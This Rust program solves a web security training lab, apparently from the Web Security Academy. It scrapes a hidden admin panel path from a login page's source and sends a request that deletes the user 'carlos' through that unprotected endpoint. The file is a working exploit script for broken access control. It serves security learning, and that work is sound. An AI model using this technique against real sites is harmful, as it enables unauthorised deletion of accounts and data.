/*************************************************************************
*
* Lab: Unprotected admin functionality with unpredictable URL
*
* Hack Steps: 
*      1. Fetch the login page
*      2. Extract the admin panel path from the source code
*      3. Delete carlos from the admin panel
*
**************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a2e00c4040397da80cc5db500fc00f6.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch("/login");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the admin panel path from the source code.. ");
    flush_terminal();

    let session = get_session_cookie(&login_page);
    let page_content = login_page.text().unwrap();
    let admin_panel_path = capture_pattern_from_text("'(/admin-.*)'", &page_content);

    println!("{} => {}", "OK".green(), admin_panel_path.yellow());
    print!("⦗3⦘ Deleting carlos from the admin panel.. ");
    flush_terminal();

    fetch_with_session(
        &format!("{admin_panel_path}/delete?username=carlos"),
        &session,
    );

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
